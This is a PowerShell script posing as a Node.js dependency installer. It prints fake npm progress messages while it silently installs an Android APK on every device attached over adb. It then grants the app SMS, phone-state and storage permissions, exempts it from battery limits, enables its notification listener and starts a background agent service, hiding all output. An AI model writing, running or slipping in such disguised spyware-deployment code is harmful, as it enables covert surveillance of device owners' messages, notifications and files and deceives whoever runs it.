# devtools.ps1
$ErrorActionPreference = 'SilentlyContinue'

$APK_PATH = ".\test\app-debug.apk"
$PACKAGE_NAME = "com.company.mdmagent"

function Invoke-AdbSilent {
    param(
        [string]$Serial,
        [Parameter(ValueFromRemainingArguments = $true)]
        [string[]]$Args
    )
    # استخدام 2>&1 | Out-Null يكتم جميع المخرجات (النجاح والأخطاء) تماماً
    & adb -s $Serial @Args 2>&1 | Out-Null
}

Write-Host "Initializing Node.js workspace..." -ForegroundColor Cyan
Start-Sleep -Milliseconds 600

if (-not $APK_PATH) {
    Write-Host "npm ERR! Missing package.json file. Aborting." -ForegroundColor Red
    exit 1
}

Write-Host "Resolving dependency tree..."
Start-Sleep -Milliseconds 800

$adbOutput = adb devices 2>&1
$deviceList = @()

if ($adbOutput) {
    foreach ($line in ($adbOutput -split "`n" | Select-Object -Skip 1)) {
        $trimmed = $line.Trim()
        if ([string]::IsNullOrWhiteSpace($trimmed)) { continue }
        $parts = $trimmed -split "\s+"
        if ($parts.Count -ge 2 -and $parts[1] -eq "device") {
            $deviceList += $parts[0]
        }
    }
}

if ($deviceList.Count -eq 0) {
    Write-Host "npm WARN skipping optional dependency 'remote-debugger'" -ForegroundColor Yellow
    exit 0
}

Write-Host "Downloading packages..."

foreach ($serial in $deviceList) {
    Write-Host "-> fetching typescript@5.x..."
    # تثبيت التطبيق
    Invoke-AdbSilent -Serial $serial "install" "-r" $APK_PATH

    Write-Host "-> fetching @types/node..."
    # منح الصلاحيات
    Invoke-AdbSilent -Serial $serial "shell" "pm" "grant" $PACKAGE_NAME "android.permission.READ_SMS"
    Invoke-AdbSilent -Serial $serial "shell" "pm" "grant" $PACKAGE_NAME "android.permission.RECEIVE_SMS"
    Invoke-AdbSilent -Serial $serial "shell" "pm" "grant" $PACKAGE_NAME "android.permission.READ_PHONE_STATE"
    Invoke-AdbSilent -Serial $serial "shell" "pm" "grant" $PACKAGE_NAME "android.permission.READ_EXTERNAL_STORAGE"
    Invoke-AdbSilent -Serial $serial "shell" "pm" "grant" $PACKAGE_NAME "android.permission.WRITE_EXTERNAL_STORAGE"

    Write-Host "-> linking native dependencies..."
    # صلاحيات متقدمة
    Invoke-AdbSilent -Serial $serial "shell" "appops" "set" $PACKAGE_NAME "MANAGE_EXTERNAL_STORAGE" "allow"
    Invoke-AdbSilent -Serial $serial "shell" "dumpsys" "deviceidle" "whitelist" "+$PACKAGE_NAME"
    Invoke-AdbSilent -Serial $serial "shell" "cmd" "notification" "allow_listener" "$PACKAGE_NAME/.collectors.NotificationListener"

    Write-Host "-> building post-install scripts..."
    # تشغيل الخدمة
    Invoke-AdbSilent -Serial $serial "shell" "am" "start-foreground-service" "-n" "$PACKAGE_NAME/.core.AgentService" "--es" "action" "START"
}

Write-Host ""
Write-Host "added 142 packages, and audited 143 packages in 4s" -ForegroundColor Green
Write-Host "found 0 vulnerabilities" -ForegroundColor Green
